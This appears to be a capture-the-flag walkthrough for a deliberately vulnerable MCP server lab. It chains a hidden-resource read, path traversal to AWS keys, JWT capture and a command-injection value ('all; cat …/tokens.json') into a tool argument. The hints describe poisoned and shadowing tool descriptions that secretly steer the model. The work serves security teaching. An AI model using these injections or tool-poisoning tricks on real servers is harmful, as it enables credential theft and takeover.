## ⚔️ Challenge 10: Multi-Vector Attack (Hard)

This challenge forces you to chain previously learned concepts (Poisoning, Shadowing, Path Traversal, and RCE) sequentially to exfiltrate and dominate an entire architecture.

---

### 🎯 Objective
Sequence a Multi-Vector attack chain to bypass isolation, extract configs and keys, and spawn RCE command injections.

---

### 🧪 Steps

**Method 1: Via MCP Burp Extension**
1. **Access Hidden Resource:** Send a `resources/read` for `system://admin` to extract the master admin password (`m@st3r-p@$$w0rd-2025`).
2. **Read Config via File Traversal:** Execute the `analyze_log_file` tool on `/tmp/dvmcp_challenge10/config/system.conf` to extract the hidden AWS keys.
3. **Capture JWT Token:** Use the `authenticate` tool mapping to the `admin` user and the master password. Copy the resulting plaintext JWT.
4. **Trigger Command Injection:** Use the `run_system_diagnostic` tool, bypassing expected CPU checks by typing the raw shell command:
   ```json
   "arguments": { "component": "cat /tmp/dvmcp_challenge10/config/tokens.json" }
   ```

**Method 2: Via MCP Client (Direct JSON Bypass)**
Because local LLMs often hallucinate instead of correctly chaining complex tool calls autonomously, we will use Direct JSON Bypass to manually send exact tool/resource calls directly to the server within the client terminal.

1. **Trigger Tool Poisoning Concept (Access Dashboard):**
   ```json
   { "resource": "system://admin" }
   ```
   *Result*: Server returns the Master Password.

2. **Trigger Tool Shadowing Concept (Access Config):**
   ```json
   { "tool": "analyze_log_file", "args": { "file_path": "/tmp/dvmcp_challenge10/config/system.conf" } }
   ```
   *Result*: Server returns the sensitive `system.conf` containing AWS keys.

3. **Trigger Token Leakage:**
   ```json
   { "tool": "authenticate", "args": { "username": "admin", "password": "m@st3r-p@$$w0rd-2025" } }
   ```
   *Result*: Server returns the plaintext JWT authorization token.

4. **Trigger Command Injection (RCE):**
   ```json
   { "tool": "run_system_diagnostic", "args": { "component": "all; cat /tmp/dvmcp_challenge10/config/tokens.json" } }
   ```
   *Result*: RCE payload triggers, dumping the hidden `tokens.json` to your screen.

---

### 🎓 For Students
Before providing the solution, use these hints to guide yourself through the attack chain:
* **Hint 1 (Recon):** Look at the descriptions for `get_user_profile` and `enhanced_check_system_status`. What hidden resources or files are they secretly told to access?
* **Hint 2 (Direct Exploitation):** You can bypass the AI entirely. Use the Burp Suite Repeater tab to directly call `resources/read` on the hidden `system://admin` resource to steal the master password.
* **Hint 3 (Exfiltration):** Use the unconstrained `analyze_log_file` tool to read the highly sensitive `/tmp/dvmcp_challenge10/config/system.conf` config file mentioned in the shadow tool's description.
* **Hint 4 (RCE Escalation):** The `run_system_diagnostic` tool expects "cpu" or "memory", but what happens if you pass a raw OS command like `cat` instead? Try dumping `tokens.json`.

---

### 📌 Expected Outcome
The successive tool responses yield the administration password, followed by database configuration text, successful token authentication, and finally raw output of the host filesystem indicating total collapse of the system perimeter.

---

### 🧩 Learning Outcome
Understand that an attacker never needs one monumental vulnerability when multiple logical flaws can be elegantly chained to dismantle access controls entirely.
